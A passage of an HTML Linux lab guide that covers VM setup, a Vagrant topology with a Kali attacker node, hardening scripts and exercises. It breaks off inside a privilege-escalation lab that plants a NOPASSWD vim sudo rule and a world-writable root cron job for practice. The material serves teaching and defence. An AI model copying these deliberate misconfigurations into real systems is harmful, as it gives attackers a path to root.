@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Rajdhani:wght@400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0c0f;--bg3:#111820;--panel:#131a22;--panel2:#1a2332;
+  --b:#1e3a5f;--b2:#0f2540;
+  --g:#00ff88;--c:#00d4ff;--y:#ffd700;--o:#ff8c00;--r:#ff3b3b;--p:#9d4edd;
+  --t:#c8d8e8;--t2:#7a9bb5;--t3:#4a6a85;
+  --mono:'JetBrains Mono',monospace;--sans:'Rajdhani','Segoe UI',sans-serif;
+}
+body{background:var(--bg);color:var(--t);font-family:var(--mono);font-size:13px;line-height:1.6;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.01) 2px,rgba(0,255,136,.01) 4px);pointer-events:none;z-index:9999}
+.wrap{max-width:1100px;margin:0 auto;padding:20px 16px}
+.panel{background:var(--panel);border:1px solid var(--b2);margin-bottom:14px;overflow:hidden}
+.ph{background:var(--panel2);border-bottom:1px solid var(--b);padding:8px 16px;display:flex;align-items:center;gap:10px}
+.pt{font-family:var(--sans);font-size:13px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--c)}
+.pn{margin-left:auto;font-size:10px;color:var(--t3);letter-spacing:1px}
+.pb{padding:18px 20px}
+@keyframes pulse{0%,100%{box-shadow:0 0 6px var(--g)}50%{box-shadow:0 0 18px var(--g);opacity:.5}}
+.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}
+.g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}
+.g4{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px}
+.cb{background:var(--bg3);border:1px solid var(--b2);padding:14px}
+.cbl{border-left:3px solid var(--c)}.cbg{border-left:3px solid var(--g)}.cby{border-left:3px solid var(--y)}.cbp{border-left:3px solid var(--p)}.cbo{border-left:3px solid var(--o)}.cbr{border-left:3px solid var(--r)}
+.cbt{font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}
+.cbl .cbt{color:var(--c)}.cbg .cbt{color:var(--g)}.cby .cbt{color:var(--y)}.cbp .cbt{color:var(--p)}.cbo .cbt{color:var(--o)}.cbr .cbt{color:var(--r)}
+.ct{color:var(--t);font-size:12.5px;line-height:1.7}
+.term{background:#050810;border:1px solid #1a2d45;overflow:hidden}
+.tbar{background:#0d1520;border-bottom:1px solid #1a2d45;padding:7px 14px;display:flex;align-items:center;gap:8px}
+.td{width:10px;height:10px;border-radius:50%}
+.tb{padding:14px 18px;font-size:12px;line-height:1.8}
+.pr{color:var(--g)}
+.sec{display:block;color:var(--t3);font-size:10px;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a2d45;padding-top:10px;margin:10px 0 4px}
+.out{display:block;color:var(--t2)}.ocn{display:block;color:var(--c)}.oyn{display:block;color:var(--y)}.ogn{display:block;color:var(--g)}.ored{display:block;color:var(--r)}.opu{display:block;color:var(--p)}
+.info{display:flex;gap:8px;padding:8px 12px;background:rgba(0,212,255,.06);border-left:3px solid var(--c);margin:10px 0;font-size:12px;color:var(--t2)}
+.warn{display:flex;gap:8px;padding:8px 12px;background:rgba(255,215,0,.06);border-left:3px solid var(--y);margin:10px 0;font-size:12px;color:var(--t2)}
+.good{display:flex;gap:8px;padding:8px 12px;background:rgba(0,255,136,.06);border-left:3px solid var(--g);margin:10px 0;font-size:12px;color:var(--t2)}
+.tag{padding:2px 8px;border-radius:2px;font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;font-family:var(--sans)}
+.tg{background:rgba(0,255,136,.12);color:var(--g);border:1px solid rgba(0,255,136,.3)}
+.tc{background:rgba(0,212,255,.1);color:var(--c);border:1px solid rgba(0,212,255,.3)}
+.ty{background:rgba(255,215,0,.1);color:var(--y);border:1px solid rgba(255,215,0,.3)}
+.tp{background:rgba(157,78,221,.12);color:var(--p);border:1px solid rgba(157,78,221,.3)}
+.to{background:rgba(255,140,0,.1);color:var(--o);border:1px solid rgba(255,140,0,.3)}
+.tr2{background:rgba(255,59,59,.1);color:var(--r);border:1px solid rgba(255,59,59,.3)}
+.hl{color:var(--g);font-weight:600}.hc{color:var(--c)}.hy{color:var(--y)}.ho{color:var(--o)}.hp{color:var(--p)}.hr{color:var(--r)}
+.div{height:1px;background:linear-gradient(to right,transparent,var(--b),transparent);margin:10px 0}
+/* lab specific */
+.node-box{background:var(--bg3);border:1px solid var(--b2);padding:12px 14px;text-align:center;flex:1;min-width:130px}
+.nb-icon{font-size:22px;margin-bottom:4px}
+.nb-name{font-family:var(--sans);font-size:12px;font-weight:700;margin-bottom:3px}
+.nb-ip{font-family:var(--mono);font-size:11px;color:var(--c)}
+.nb-spec{font-size:10px;color:var(--t3);margin-top:3px}
+.nb-arrow{padding:0 4px;color:var(--t3);font-size:14px;flex-shrink:0;display:flex;align-items:center}
+/* exercise cards */
+.ex-card{background:var(--bg3);border:1px solid var(--b2);border-left:3px solid;padding:14px;margin-bottom:10px}
+.ex-num{font-family:var(--sans);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.ex-title{font-family:var(--sans);font-size:14px;font-weight:700;margin-bottom:6px}
+.ex-body{font-size:12px;color:var(--t2);line-height:1.7;margin-bottom:8px}
+.ex-task{background:var(--bg);padding:6px 12px;font-size:11px;margin:3px 0;color:var(--t2)}
+.ex-task::before{content:"→ ";color:var(--g)}
+.ex-verify{margin-top:8px;background:var(--bg);padding:6px 12px;border-left:2px solid var(--y);font-size:11px;color:var(--y)}
+/* phase timeline */
+.phase{display:flex;gap:14px;align-items:flex-start;position:relative;margin-bottom:0}
+.phase-line{position:absolute;left:15px;top:32px;bottom:-10px;width:1px;background:linear-gradient(to bottom,var(--g),transparent)}
+.phase-dot{width:32px;min-width:32px;height:32px;border-radius:50%;border:2px solid var(--g);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--g);background:rgba(0,255,136,.08);flex-shrink:0;font-family:var(--sans)}
+.phase-body{flex:1;background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;margin-bottom:10px}
+.phase-title{font-family:var(--sans);font-weight:600;font-size:13px;color:var(--g);margin-bottom:3px}
+.phase-desc{font-size:11.5px;color:var(--t2)}
+.phase-cmd{margin-top:5px;background:var(--bg);padding:3px 10px;font-size:11px;color:var(--c);border-left:2px solid var(--c)}
+/* option cards */
+.opt-card{background:var(--bg3);border:1px solid var(--b2);padding:14px}
+.oc-icon{font-size:24px;margin-bottom:6px}
+.oc-name{font-family:var(--sans);font-weight:700;font-size:13px;margin-bottom:3px}
+.oc-diff{font-size:10px;font-family:var(--sans);font-weight:600;letter-spacing:1px;margin-bottom:6px}
+.oc-body{font-size:11.5px;color:var(--t2);line-height:1.6}
+/* test result */
+.test-row{display:flex;align-items:flex-start;gap:10px;padding:6px 0;border-bottom:1px solid var(--b2);font-size:12px}
+.test-status{width:22px;height:22px;min-width:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:1px}
+.ts-pass{background:rgba(0,255,136,.15);color:var(--g);border:1px solid rgba(0,255,136,.4)}
+.ts-fail{background:rgba(255,59,59,.15);color:var(--r);border:1px solid rgba(255,59,59,.4)}
+.ts-warn{background:rgba(255,215,0,.15);color:var(--y);border:1px solid rgba(255,215,0,.4)}
+.test-name{flex:1;color:var(--t)}
+.test-cmd{font-size:10px;color:var(--t3);margin-top:2px;font-family:var(--mono)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- HEADER -->
+<div style="background:linear-gradient(135deg,#0d1a2e,#0a1520);border:1px solid var(--b);border-top:3px solid var(--g);padding:20px 24px;margin-bottom:16px;position:relative;overflow:hidden">
+  <div style="position:absolute;right:-60px;top:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(0,255,136,.05),transparent 70%);pointer-events:none"></div>
+  <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px">
+    <div>
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+        <div style="width:8px;height:8px;border-radius:50%;background:var(--g);animation:pulse 2s infinite"></div>
+        <span style="font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--g)">LAB MODULE ● HANDS-ON PRACTICAL</span>
+      </div>
+      <h1 style="font-family:var(--sans);font-size:26px;font-weight:700;color:#fff;letter-spacing:1px;line-height:1.2">Linux <span style="color:var(--g)">Lab Setup</span> &amp; Practical Tests</h1>
+      <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px">
+        <span class="tag tg">⊕ Environment Setup</span>
+        <span class="tag tc">⊞ 5-Node Lab Topology</span>
+        <span class="tag ty">⊛ 12 Practical Exercises</span>
+        <span class="tag tp">⬡ Automated Test Suite</span>
+        <span class="tag to">⊘ CTF-Style Challenges</span>
+      </div>
+    </div>
+    <div style="text-align:right;font-size:11px;color:var(--t3);line-height:1.9;font-family:var(--mono)">
+      <div>TYPE: <span style="color:var(--c)">Hands-On Lab</span></div>
+      <div>DURATION: <span style="color:var(--c)">8–16 hours</span></div>
+      <div>DIFFICULTY: <span style="color:var(--c)">L5–L7</span></div>
+      <div>PANELS: <span style="color:var(--c)">10</span></div>
+      <div style="margin-top:6px;font-size:10px;color:#1e6a3a">▓▓▓▓▓▓▓▓▓▓ LAB READY</div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 01 — ENVIRONMENT OPTIONS -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🖥</span><span class="pt">Lab Environment Options — Choose Your Setup</span><span class="pn">PANEL 01</span></div>
+  <div class="pb">
+    <div class="info"><span style="color:var(--c);flex-shrink:0">ℹ</span><span>You need <strong style="color:var(--c)">at least one Linux VM</strong> for individual exercises, and <strong style="color:var(--c)">3–5 VMs</strong> for the full enterprise lab topology. All options below work — choose based on your host OS and hardware.</span></div>
+
+    <div class="g4" style="margin-bottom:14px">
+      <div class="opt-card">
+        <div class="oc-icon">📦</div>
+        <div class="oc-name" style="color:var(--g)">VirtualBox</div>
+        <div class="oc-diff" style="color:var(--g)">RECOMMENDED — BEGINNER</div>
+        <div class="oc-body">Free, works on Windows/macOS/Linux. GUI for creating VMs. Supports snapshots, NAT networking, host-only adapters. Ideal for multi-VM labs.</div>
+      </div>
+      <div class="opt-card">
+        <div class="oc-icon">⚡</div>
+        <div class="oc-name" style="color:var(--c)">KVM / libvirt</div>
+        <div class="oc-diff" style="color:var(--c)">RECOMMENDED — LINUX HOST</div>
+        <div class="oc-body">Best performance on Linux. Native hypervisor. Use virt-manager for GUI or virsh CLI. Near-bare-metal speed. Already covered in Step 10.</div>
+      </div>
+      <div class="opt-card">
+        <div class="oc-icon">🐳</div>
+        <div class="oc-name" style="color:var(--y)">WSL2 + Docker</div>
+        <div class="oc-diff" style="color:var(--y)">QUICK START — WINDOWS HOST</div>
+        <div class="oc-body">WSL2 gives real Linux kernel on Windows. Docker Desktop for containers. Good for individual exercises. Limited for full HA/networking labs.</div>
+      </div>
+      <div class="opt-card">
+        <div class="oc-icon">☁️</div>
+        <div class="oc-name" style="color:var(--o)">Oracle Cloud Free Tier</div>
+        <div class="oc-diff" style="color:var(--o)">FREE CLOUD — ALWAYS-ON</div>
+        <div class="oc-body">4 Ampere A1 cores + 24GB RAM free forever. Perfect for persistent lab. Public IP. Real SSH practice. Deploy full topology here.</div>
+      </div>
+      <div class="opt-card">
+        <div class="oc-icon">🚀</div>
+        <div class="oc-name" style="color:var(--p)">Vagrant + VirtualBox</div>
+        <div class="oc-diff" style="color:var(--p)">AUTOMATED — REPRODUCIBLE</div>
+        <div class="oc-body">Vagrantfile describes entire lab. <code>vagrant up</code> creates 5 VMs in minutes. Destroy and rebuild instantly. Best for repeatable lab exercises.</div>
+      </div>
+      <div class="opt-card">
+        <div class="oc-icon">🎮</div>
+        <div class="oc-name" style="color:var(--r)">TryHackMe / HackTheBox</div>
+        <div class="oc-diff" style="color:var(--r)">ONLINE — SECURITY FOCUS</div>
+        <div class="oc-body">Browser-based Linux rooms. Pre-configured vulnerable machines. Great for practising Steps 4, 6, 7 (security). No setup required.</div>
+      </div>
+    </div>
+
+    <!-- Minimum specs -->
+    <div class="g2">
+      <div class="cb cby">
+        <div class="cbt">Minimum Host Hardware</div>
+        <div class="ct" style="font-size:12px;line-height:1.9">
+          <span class="hy">RAM:</span> 16GB (8GB minimum for 1 VM)<br>
+          <span class="hy">CPU:</span> 4 cores, VT-x/AMD-V enabled in BIOS<br>
+          <span class="hy">Disk:</span> 100GB free (50GB minimum)<br>
+          <span class="hy">OS:</span> Windows 10/11, macOS 12+, or Linux<br><br>
+          <span class="hl">Check VT-x on Windows:</span><br>
+          Task Manager → Performance → CPU → Virtualisation: Enabled
+        </div>
+      </div>
+      <div class="cb cbg">
+        <div class="cbt">Recommended VM Specs</div>
+        <div class="ct" style="font-size:12px;line-height:1.9">
+          <span class="hl">lab-web</span> — 2 vCPU, 2GB RAM, 20GB disk<br>
+          <span class="hl">lab-db</span> — 2 vCPU, 4GB RAM, 30GB disk<br>
+          <span class="hl">lab-lb</span> — 1 vCPU, 1GB RAM, 10GB disk<br>
+          <span class="hl">lab-monitor</span> — 2 vCPU, 3GB RAM, 20GB disk<br>
+          <span class="hl">lab-attacker</span> — 2 vCPU, 2GB RAM, 20GB disk (Kali)<br><br>
+          <span class="hc">Total:</span> 9 vCPU, 12GB RAM, 100GB disk
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 02 — LAB TOPOLOGY -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🗺</span><span class="pt">Lab Network Topology — 5-Node Enterprise Setup</span><span class="pn">PANEL 02</span></div>
+  <div class="pb">
+    <!-- Network diagram -->
+    <div style="background:var(--bg);border:1px solid var(--b2);padding:16px;margin-bottom:14px">
+      <div style="font-family:var(--sans);font-size:10px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:12px">Lab Network: 192.168.100.0/24 (Host-Only)</div>
+
+      <!-- Internet/Host -->
+      <div style="text-align:center;margin-bottom:8px">
+        <div style="display:inline-block;background:rgba(157,78,221,.1);border:1px solid rgba(157,78,221,.3);padding:8px 20px;font-family:var(--sans);font-weight:700;font-size:12px;color:var(--p)">
+          🖥 HOST MACHINE — Your Laptop/Desktop
+        </div>
+      </div>
+      <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px">↕ Host-Only Adapter (192.168.100.1)</div>
+
+      <!-- LB -->
+      <div style="display:flex;justify-content:center;gap:6px;margin-bottom:6px;flex-wrap:wrap">
+        <div class="node-box" style="border-top:2px solid var(--c);max-width:180px">
+          <div class="nb-icon">⚖️</div>
+          <div class="nb-name" style="color:var(--c)">lab-lb</div>
+          <div class="nb-ip">192.168.100.10</div>
+          <div class="nb-spec">HAProxy + Keepalived<br>Ubuntu 24.04 LTS</div>
+        </div>
+      </div>
+      <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px">↓ routes to</div>
+
+      <!-- App nodes -->
+      <div style="display:flex;justify-content:center;gap:6px;margin-bottom:6px;flex-wrap:wrap">
+        <div class="node-box" style="border-top:2px solid var(--g)">
+          <div class="nb-icon">🌐</div>
+          <div class="nb-name" style="color:var(--g)">lab-web</div>
+          <div class="nb-ip">192.168.100.20</div>
+          <div class="nb-spec">nginx + app server<br>Ubuntu 24.04 LTS</div>
+        </div>
+        <div class="node-box" style="border-top:2px solid var(--y)">
+          <div class="nb-icon">🗄️</div>
+          <div class="nb-name" style="color:var(--y)">lab-db</div>
+          <div class="nb-ip">192.168.100.30</div>
+          <div class="nb-spec">PostgreSQL 16<br>Ubuntu 24.04 LTS</div>
+        </div>
+        <div class="node-box" style="border-top:2px solid var(--o)">
+          <div class="nb-icon">📈</div>
+          <div class="nb-name" style="color:var(--o)">lab-monitor</div>
+          <div class="nb-ip">192.168.100.40</div>
+          <div class="nb-spec">Prometheus + Grafana<br>Ubuntu 24.04 LTS</div>
+        </div>
+        <div class="node-box" style="border-top:2px solid var(--r)">
+          <div class="nb-icon">⚔️</div>
+          <div class="nb-name" style="color:var(--r)">lab-attacker</div>
+          <div class="nb-ip">192.168.100.99</div>
+          <div class="nb-spec">Kali Linux<br>(Red Team practice)</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">Vagrant — spin up entire lab with one command</span></div>
+      <div class="tb">
+        <span class="sec">──── Vagrantfile — FULL LAB DEFINITION ────</span>
+        <span class="oyn">Vagrant.configure("2") do |config|</span>
+        <span class="oyn">  config.vm.box = "ubuntu/jammy64"</span>
+        <span class="out"></span>
+        <span class="oyn">  # Load Balancer</span>
+        <span class="out">  config.vm.define "lab-lb" do |lb|</span>
+        <span class="out">    lb.vm.hostname = "lab-lb"</span>
+        <span class="out">    lb.vm.network "private_network", ip: "192.168.100.10"</span>
+        <span class="ocn">    lb.vm.provider "virtualbox" do |v| v.memory=1024; v.cpus=1 end</span>
+        <span class="out">    lb.vm.provision "shell", path: "provision/lb.sh"</span>
+        <span class="out">  end</span>
+        <span class="oyn">  # Web Server</span>
+        <span class="out">  config.vm.define "lab-web" do |web|</span>
+        <span class="out">    web.vm.hostname = "lab-web"</span>
+        <span class="out">    web.vm.network "private_network", ip: "192.168.100.20"</span>
+        <span class="ocn">    web.vm.provider "virtualbox" do |v| v.memory=2048; v.cpus=2 end</span>
+        <span class="out">    web.vm.provision "shell", path: "provision/web.sh"</span>
+        <span class="out">  end</span>
+        <span class="oyn">  # Database</span>
+        <span class="out">  config.vm.define "lab-db" do |db|</span>
+        <span class="out">    db.vm.hostname = "lab-db"</span>
+        <span class="out">    db.vm.network "private_network", ip: "192.168.100.30"</span>
+        <span class="ocn">    db.vm.provider "virtualbox" do |v| v.memory=4096; v.cpus=2 end</span>
+        <span class="out">    db.vm.provision "shell", path: "provision/db.sh"</span>
+        <span class="out">  end</span>
+        <span class="oyn">  # Monitoring</span>
+        <span class="out">  config.vm.define "lab-monitor" do |mon|</span>
+        <span class="out">    mon.vm.network "private_network", ip: "192.168.100.40"</span>
+        <span class="ocn">    mon.vm.provider "virtualbox" do |v| v.memory=3072; v.cpus=2 end</span>
+        <span class="out">  end</span>
+        <span class="oyn">  # Kali Attacker</span>
+        <span class="out">  config.vm.define "lab-attacker" do |atk|</span>
+        <span class="out">    atk.vm.box = "kalilinux/rolling"</span>
+        <span class="out">    atk.vm.network "private_network", ip: "192.168.100.99"</span>
+        <span class="out">  end</span>
+        <span class="oyn">end</span>
+        <span class="sec">──── START LAB ────</span>
+        <span><span class="pr">host:~$ </span><span style="color:#fff">vagrant up                    # creates all 5 VMs</span></span>
+        <span><span class="pr">host:~$ </span><span style="color:#fff">vagrant ssh lab-web            # SSH into web server</span></span>
+        <span><span class="pr">host:~$ </span><span style="color:#fff">vagrant snapshot save lab-web fresh-install  # snapshot before experiments</span></span>
+        <span><span class="pr">host:~$ </span><span style="color:#fff">vagrant snapshot restore lab-web fresh-install  # restore if broken</span></span>
+        <span><span class="pr">host:~$ </span><span style="color:#fff">vagrant destroy -f && vagrant up  # full reset</span></span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 03 — BASE PROVISIONING SCRIPT -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">⚙</span><span class="pt">Base Provisioning — Bootstrap Every Lab Node</span><span class="pn">PANEL 03</span></div>
+  <div class="pb">
+    <div class="term">
+      <div class="tbar"><div class="td" style="background:#ff5f57"></div><div class="td" style="background:#febc2e"></div><div class="td" style="background:#28c840"></div>
+        <span style="margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)">provision/base.sh — run on every node after first boot</span></div>
+      <div class="tb">
+        <span class="oyn">#!/bin/bash</span>
+        <span class="oyn">set -euo pipefail</span>
+        <span class="out">echo "=== Base provisioning: $(hostname) ==="</span>
+        <span class="sec">──── 1. UPDATE & ESSENTIALS ────</span>
+        <span class="out">export DEBIAN_FRONTEND=noninteractive</span>
+        <span class="out">apt update -qq && apt upgrade -y -qq</span>
+        <span class="out">apt install -y -qq \</span>
+        <span class="ocn">  curl wget git vim tmux tree htop iotop nethogs \</span>
+        <span class="ocn">  net-tools dnsutils nmap tcpdump \</span>
+        <span class="ocn">  build-essential strace lsof auditd \</span>
+        <span class="ocn">  ufw fail2ban aide logrotate \</span>
+        <span class="ocn">  jq python3 python3-pip unzip</span>
+        <span class="sec">──── 2. /etc/hosts (lab DNS) ────</span>
+        <span class="oyn">cat >> /etc/hosts << EOF</span>
+        <span class="oyn">192.168.100.10  lab-lb</span>
+        <span class="oyn">192.168.100.20  lab-web</span>
+        <span class="oyn">192.168.100.30  lab-db</span>
+        <span class="oyn">192.168.100.40  lab-monitor</span>
+        <span class="oyn">192.168.100.99  lab-attacker</span>
+        <span class="oyn">EOF</span>
+        <span class="sec">──── 3. SSH HARDENING ────</span>
+        <span class="oyn">sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config</span>
+        <span class="oyn">sed -i 's/#MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config</span>
+        <span class="oyn">sed -i 's/X11Forwarding yes/X11Forwarding no/' /etc/ssh/sshd_config</span>
+        <span class="oyn">systemctl reload sshd</span>
+        <span class="sec">──── 4. FIREWALL BASELINE ────</span>
+        <span class="oyn">ufw default deny incoming</span>
+        <span class="oyn">ufw default allow outgoing</span>
+        <span class="oyn">ufw allow 22/tcp comment "SSH"</span>
+        <span class="oyn">ufw --force enable</span>
+        <span class="sec">──── 5. AUDITD RULES ────</span>
+        <span class="oyn">cat > /etc/audit/rules.d/99-lab.rules << 'RULES'</span>
+        <span class="oyn">-w /etc/passwd  -p wa -k identity</span>
+        <span class="oyn">-w /etc/shadow  -p wa -k identity</span>
+        <span class="oyn">-w /etc/sudoers -p wa -k sudoers</span>
+        <span class="oyn">-a always,exit -F arch=b64 -S execve -F euid=0 -k root_cmds</span>
+        <span class="oyn">RULES</span>
+        <span class="oyn">augenrules --load && systemctl enable --now auditd</span>
+        <span class="sec">──── 6. KERNEL HARDENING ────</span>
+        <span class="oyn">cat > /etc/sysctl.d/99-lab-hardening.conf << 'SYSCTL'</span>
+        <span class="oyn">kernel.dmesg_restrict = 1</span>
+        <span class="oyn">kernel.kptr_restrict = 2</span>
+        <span class="oyn">kernel.randomize_va_space = 2</span>
+        <span class="oyn">net.ipv4.tcp_syncookies = 1</span>
+        <span class="oyn">net.ipv4.conf.all.rp_filter = 1</span>
+        <span class="oyn">fs.protected_hardlinks = 1</span>
+        <span class="oyn">fs.protected_symlinks = 1</span>
+        <span class="oyn">SYSCTL</span>
+        <span class="oyn">sysctl --system -q</span>
+        <span class="sec">──── 7. AIDE BASELINE ────</span>
+        <span class="oyn">aide --init 2>/dev/null && mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db</span>
+        <span class="out">echo "=== Base provisioning complete ==="</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PANEL 04 — PRACTICAL EXERCISES (Steps 1-6) -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🧪</span><span class="pt">Practical Exercises — Steps 1–6 (Kernel to Networking)</span><span class="pn">PANEL 04</span></div>
+  <div class="pb">
+
+    <div class="ex-card" style="border-left-color:var(--c)">
+      <div class="ex-num" style="color:var(--c)">LAB 01 — SYSTEM EXPLORATION</div>
+      <div class="ex-title" style="color:var(--c)">Map the entire system — from CPU to kernel to processes</div>
+      <div class="ex-body">SSH into lab-web. Without looking up answers, document the system: kernel version, distro, CPU architecture, loaded modules, running process tree, all open ports, all listening sockets, and the path every packet takes from <code>curl lab-lb</code> to nginx.</div>
+      <div class="ex-task">uname -a; cat /etc/os-release; lscpu | grep -E "Arch|CPU|Model"</div>
+      <div class="ex-task">lsmod | head -15; pstree -p | head -20</div>
+      <div class="ex-task">ss -tlnp; ip route show; ip addr show</div>
+      <div class="ex-task">strace -c curl http://lab-lb 2>&1 | tail -10   # trace syscalls</div>
+      <div class="ex-verify">✓ VERIFY: Can you explain where nginx is in the process tree, which FDs are open, and what the default route is?</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--g)">
+      <div class="ex-num" style="color:var(--g)">LAB 02 — FILESYSTEM FORENSICS</div>
+      <div class="ex-title" style="color:var(--g)">Investigate every directory and permission in the system</div>
+      <div class="ex-body">On lab-web: find all SUID binaries, all world-writable files, all files modified in the last 24 hours, and the inode of /etc/passwd. Explain the permission string of every file in /usr/bin/sudo's directory.</div>
+      <div class="ex-task">find / -perm -4000 -type f 2>/dev/null | sort</div>
+      <div class="ex-task">find / -perm -002 -not -path '/proc/*' -type f 2>/dev/null</div>
+      <div class="ex-task">find / -newer /etc/passwd -not -path '/proc/*' -type f 2>/dev/null | head -20</div>
+      <div class="ex-task">stat /etc/passwd; ls -lai /etc/passwd; df -i /</div>
+      <div class="ex-verify">✓ VERIFY: Did you find any unexpected SUID binaries? Any world-writable files outside /tmp? Note them.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--y)">
+      <div class="ex-num" style="color:var(--y)">LAB 03 — USER & PERMISSION MANAGEMENT</div>
+      <div class="ex-title" style="color:var(--y)">Build a multi-user environment with proper access controls</div>
+      <div class="ex-body">Create users: alice (developer), bob (read-only auditor), carol (deploy account). Set up a /shared/project directory where alice has rwx, bob has r-x, carol has rwx, but no other users. Use ACLs. Then prove bob cannot delete alice's files.</div>
+      <div class="ex-task">useradd -m -s /bin/bash alice bob carol</div>
+      <div class="ex-task">mkdir -p /shared/project && chmod 750 /shared/project</div>
+      <div class="ex-task">setfacl -m u:alice:rwx,u:bob:r-x,u:carol:rwx /shared/project</div>
+      <div class="ex-task">setfacl -d -m u:alice:rwx,u:bob:r-x,u:carol:rwx /shared/project</div>
+      <div class="ex-task">su - bob -c "rm /shared/project/alice_file.txt" 2>&1   # should fail</div>
+      <div class="ex-verify">✓ VERIFY: getfacl /shared/project shows correct ACLs. Bob cannot delete alice's files. Carol can write.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--o)">
+      <div class="ex-num" style="color:var(--o)">LAB 04 — SERVICE MANAGEMENT & SYSTEMD</div>
+      <div class="ex-title" style="color:var(--o)">Deploy a hardened web application as a systemd service</div>
+      <div class="ex-body">Create a Python Flask app that serves /health (returns 200 OK) on port 8080. Write a production systemd unit with: non-root user, PrivateTmp, NoNewPrivileges, ProtectSystem=strict, MemoryMax=256M, Restart=on-failure. Verify it restarts automatically when killed.</div>
+      <div class="ex-task">python3 -c "from flask import Flask; app=Flask(__name__); app.route('/health')(lambda: 'OK'); app.run(port=8080)"</div>
+      <div class="ex-task">vim /etc/systemd/system/labapp.service  # write hardened unit</div>
+      <div class="ex-task">systemctl enable --now labapp && systemctl status labapp</div>
+      <div class="ex-task">kill -9 $(pgrep -f labapp) && sleep 3 && systemctl status labapp</div>
+      <div class="ex-verify">✓ VERIFY: systemd-analyze security labapp.service shows low exposure score. Service auto-restarts after kill.</div>
+    </div>
+
+    <div class="ex-card" style="border-left-color:var(--p)">
+      <div class="ex-num" style="color:var(--p)">LAB 05 — NETWORKING & FIREWALL</div>
+      <div class="ex-title" style="color:var(--p)">Configure full network security between lab nodes</div>
+      <div class="ex-body">On lab-web: configure nftables to: allow SSH only from 192.168.100.0/24, allow port 8080 from lab-lb only, allow port 5432 to lab-db only, log and drop everything else. Verify from lab-attacker that port 8080 is not reachable.</div>
+      <div class="ex-task">nft flush ruleset</div>
+      <div class="ex-task">nft add table inet filter</div>
+      <div class="ex-task">nft add chain inet filter input '{ type filter hook input priority 0; policy drop; }'</div>
+      <div class="ex-task">nft add rule inet filter input ct state established,related accept</div>
+      <div class="ex-task">nft add rule inet filter input ip saddr 192.168.100.0/24 tcp dport 22 accept</div>
+      <div class="ex-task">nft add rule inet filter input ip saddr 192.168.100.10 tcp dport 8080 accept</div>
+      <div class="ex-verify">✓ VERIFY: From lab-attacker: nmap -p 8080 192.168.100.20 shows port filtered. From lab-lb it shows open.</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PANEL 05 — PRACTICAL EXERCISES (Steps 7-12) -->
+<div class="panel">
+  <div class="ph"><span style="font-size:14px">🛡</span><span class="pt">Practical Exercises — Steps 7–12 (Security to Enterprise)</span><span class="pn">PANEL 05</span></div>
+  <div class="pb">
+
+    <div class="ex-card" style="border-left-color:var(--r)">
+      <div class="ex-num" style="color:var(--r)">LAB 06 — PRIVILEGE ESCALATION (Red Team)</div>
+      <div class="ex-title" style="color:var(--r)">Find and exploit 3 misconfiguration vulnerabilities</div>
+      <div class="ex-body">Run the following misconfigurations on lab-web (as root), then switch to alice and try to escalate to root using each one. After each exploit, fix the misconfiguration and verify it's no longer exploitable.</div>
+      <div class="ex-task"># Misconfiguration 1: Bad sudo rule
+echo "alice ALL=(ALL) NOPASSWD: /usr/bin/vim" >> /etc/sudoers</div>
+      <div class="ex-task"># Misconfiguration 2: World-writable cron
+echo "* * * * * root /tmp/exploit.sh" > /etc/cron.d/test && chmod 777 /etc/cron.d/test</div>
+      <div class="ex-task"># Misconfiguration 3: Python with cap_setuid
